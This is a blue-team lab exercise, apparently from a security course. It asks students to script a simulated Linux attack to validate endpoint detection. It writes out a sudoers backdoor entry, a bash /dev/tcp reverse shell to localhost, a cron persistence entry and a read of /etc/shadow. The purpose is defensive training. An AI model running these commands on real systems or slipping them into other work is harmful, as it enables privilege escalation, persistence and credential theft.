# 11. Linux Attacker Simulation

**Goal:** Execute a controlled sequence of attacker-like actions on the hardened Linux endpoint and record the ground truth.

## Context

The same validation methodology applied to Windows now applies to Linux. The attacker actions mirror the Crimson Tide Linux-specific techniques: create a user, modify sudoers, execute from `/tmp`, attempt a reverse shell (to localhost, safe), establish cron persistence, access sensitive files.

## Instructions

Write a script `11-linux_attack_sim.sh` that executes the following sequence with timestamps:

- Create a user (`useradd testattacker`)
- Modify sudoers (`echo "testattacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/backdoor`)
- Execute a binary from `/tmp` (`cp /usr/bin/id /tmp/suspicious_bin && /tmp/suspicious_bin`)
- Attempt a reverse shell to localhost (`bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' ; sleep 1 ; kill %1 2>/dev/null`)
- Modify crontab (`echo "* * * * * /tmp/beacon.sh" > /etc/cron.d/persistence_test`)
- Access sensitive files (`cat /etc/shadow > /dev/null`)

Clean up all artifacts. Produce ground truth JSON.

## Expected Output

```
$ sudo ./11-linux_attack_sim.sh
[*] Running Linux attacker simulation...
    [1/6] Creating user testattacker...                2026-03-25T14:35:01Z
    [2/6] Modifying sudoers...                         2026-03-25T14:35:02Z
    [3/6] Executing from /tmp...                       2026-03-25T14:35:03Z
    [4/6] Reverse shell attempt (localhost)...         2026-03-25T14:35:04Z
    [5/6] Cron persistence...                          2026-03-25T14:35:05Z
    [6/6] Accessing /etc/shadow...                     2026-03-25T14:35:06Z
[*] Cleaning up artifacts...                           [CLEAN]
Actions executed: 6
Ground truth saved to: linux_attack_log.json
```

## Repo

- **GitHub repository:** `dlh-cyber_security`
- **Directory:** `blue_team/2x02_eyes_on_endpoint`
- **File:** `11-linux_attack_sim.sh`
